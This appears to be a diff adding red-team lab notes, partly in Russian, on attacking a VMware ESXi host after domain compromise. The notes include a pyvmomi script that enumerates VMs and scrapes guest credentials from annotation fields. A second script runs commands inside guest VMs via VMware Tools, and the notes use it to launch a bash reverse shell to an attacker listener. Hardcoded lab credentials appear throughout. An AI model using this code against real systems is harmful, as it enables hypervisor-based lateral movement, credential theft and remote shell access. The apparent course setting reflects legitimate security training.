@@ -1,0 +1,200 @@
+#после получения доступа к DC
+проверяеместь группы, есть ли есть в группе ESX Admins
+# проверяем открыт ли http порт с 
+nmap -sT -sV 10.5.2.111 -Pn с VMWare server
+
+
+Check the availability of the Guest VMs
+Check whether VMWare Tools are installed or not
+When VMware Tools are present, an attacker with ESXi root privileges can
+abuse management APIs and tooling to execute arbitrary actions against the
+host and its guests.
+Scrape the Annotations / Notes field
+High probability of admin writing credentials
+
+─(venv)─(kali㉿kali)-[~/Downloads/courses/AD-RTS/lsass]
+└─$ pip3 install pyvmomi
+
+esxi.py
+#!/usr/bin/env python3
+import ssl
+from pyVim.connect import SmartConnect, Disconnect
+from pyVmomi import vim
+
+ctx = ssl._create_unverified_context()
+si = SmartConnect(
+    host="10.5.2.111", 
+    user="administrator@telecore.ad",
+    pwd="August1990password12313122121", 
+    sslContext=ctx
+)
+
+content = si.RetrieveContent()
+
+for vm in content.viewManager.CreateContainerView(
+    content.rootFolder, 
+    [vim.VirtualMachine], 
+    True
+).view:
+    # Получаем IP адрес
+    if vm.guest.ipAddress:
+        ip = vm.guest.ipAddress
+    elif vm.guest.net and vm.guest.net[0].ipConfig.ipAddress:
+        ip = vm.guest.net[0].ipConfig.ipAddress[0].ipAddress
+    else:
+        ip = "N/A"
+    
+    # Выводим информацию о виртуальной машине
+    print(f"VM: {vm.name}")
+    print(f"  Power: {vm.runtime.powerState}")
+    print(f"  OS: {vm.config.guestFullName}")
+    print(f"  Tools: {vm.guest.toolsStatus}")
+    print(f"  IP: {ip}")
+    print(f"  Notes: {vm.config.annotation}")
+    print()
+
+Disconnect(si)
+
+
+┌──(venv)─(kali㉿kali)-[~/Downloads/courses/AD-RTS/lsass]
+└─$ python3 esxi.py
+
+вывод может быть примерно таким
+Power: poweredOn
+OS: Ubuntu Linux (64-bit)
+Tools: toolsOk
+IP: 10.5.2.50
+Notes: Guest VM Credentials :
+
+linux \ Password@123
+
+“VaultVM” is present inside the ESXI Server.
+The IP along with the power state is disclosed.
+Guest VM Credentials is hardcoded & present in the Annotations / Notes field
+Most importantly, VMWare Tools are installed
+With the cherry on the top, we have root privileges on the ESXi. This is the perfect scenario
+for code execution against the guest linux machine.
+Since the “10.5.2.50” is in the same range, we will try to take the reverse shell of the Guest
+Vault-VM.
+Let’s run this script
+
+
+#ставим listener
+nc -nvlp 5556
+
+                                                              #cmd_exec.py
+#!/usr/bin/env python3
+import ssl
+import argparse
+import sys
+import time
+from pyVim import connect
+from pyVmomi import vim
+
+# Парсинг аргументов командной строки
+ap = argparse.ArgumentParser(description="Execute command on ESXi guest VM")
+ap.add_argument("--host", required=True, help="ESXi host IP address")
+ap.add_argument("--user", required=True, help="ESXi username")
+ap.add_argument("--password", required=True, help="ESXi password")
+ap.add_argument("--vm", required=True, help="Virtual machine name")
+ap.add_argument("--guest-user", required=True, help="Guest OS username")
+ap.add_argument("--guest-pass", required=True, help="Guest OS password")
+ap.add_argument("--cmd", required=True, help="Command to execute")
+ap.add_argument("--args", default="", help="Command arguments")
+
+args = ap.parse_args()
+
+# Подключение к ESXi
+try:
+    context = ssl._create_unverified_context()
+    si = connect.SmartConnect(
+        host=args.host,
+        user=args.user,
+        pwd=args.password,
+        sslContext=context
+    )
+    print(f"Connected to {args.host}")
+except Exception as e:
+    print(f"Connection failed: {e}")
+    sys.exit(1)
+
+# Поиск виртуальной машины
+try:
+    content = si.RetrieveContent()
+    container_view = content.viewManager.CreateContainerView(
+        content.rootFolder,
+        [vim.VirtualMachine],
+        True
+    )
+    
+    vm = None
+    for virtual_machine in container_view.view:
+        if virtual_machine.name == args.vm:
+            vm = virtual_machine
+            break
+    
+    if vm is None:
+        print(f"VM '{args.vm}' not found!")
+        connect.Disconnect(si)
+        sys.exit(1)
+        
+    print(f"Found VM: {vm.name}")
+    
+except Exception as e:
+    print(f"Error finding VM: {e}")
+    connect.Disconnect(si)
+    sys.exit(1)
+
+# Выполнение команды в гостевой ОС
+try:
+    pm = content.guestOperationsManager.processManager
+    
+    # Аутентификация в гостевой ОС
+    auth = vim.NamePasswordAuthentication(
+        username=args.guest_user,
+        password=args.guest_pass
+    )
+    
+    # Спецификация программы
+    program_spec = vim.vm.guest.ProcessManager.ProgramSpec(
+        programPath=args.cmd,
+        arguments=args.args
+    )
+    
+    # Запуск программы
+    print(f"Executing: {args.cmd} {args.args}")
+    pid = pm.StartProgramInGuest(vm, auth, program_spec)
+    print(f"Started PID: {pid}")
+    
+    # Ожидание и проверка результата
+    time.sleep(2)
+    
+    # Получение информации о процессе
+    process_info = pm.ListProcessesInGuest(vm, auth, [pid])
+    if process_info:
+        exit_code = process_info[0].exitCode
+        print(f"Exit code: {exit_code}")
+    else:
+        print("Process not found")
+        
+except Exception as e:
+    print(f"Error executing command: {e}")
+
+# Отключение
+finally:
+    connect.Disconnect(si)
+    print("Disconnected")
+
+
+python3 cmd_exec.py --host 10.5.2.111 --user administrator@telecore.ad
+--password 'DA_Pass' --vm 'VaultVM' --guest-user linux --guest-pass 'пароль'
+--cmd /bin/bash --args "-c 'bash -i >& /dev/tcp/<VPN_IP>/5556 0>&1'"
+
+
+
+
+
+
+
+
+
